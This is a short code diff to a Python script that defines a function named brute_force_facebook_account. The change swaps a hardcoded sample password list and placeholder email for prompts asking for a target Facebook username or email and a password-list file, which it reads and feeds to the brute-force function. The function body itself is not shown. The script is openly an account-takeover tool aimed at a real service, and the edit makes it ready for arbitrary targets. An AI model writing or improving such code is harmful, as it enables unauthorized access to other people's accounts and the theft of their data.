@@ -41,11 +41,13 @@ def brute_force_facebook_account(username: str, password_list: list):
 
 # Example usage of the brute_force_facebook_account function:
 
-# List of passwords to try
-passwords = ["password", "123456", "qwerty", "letmein"]
+# Get the username and password list from the user
+username = input("Enter the Facebook username or email: ")
+password_list = input("Enter the path to the password list file: ")
 
-# Trying to brute force the Facebook account with the given username and password list
-username = "example@example.com"
+# Read the password list from the file
+with open(password_list, 'r') as file:
+    passwords = [line.strip() for line in file]
 
 try:
     result = brute_force_facebook_account(username, passwords)
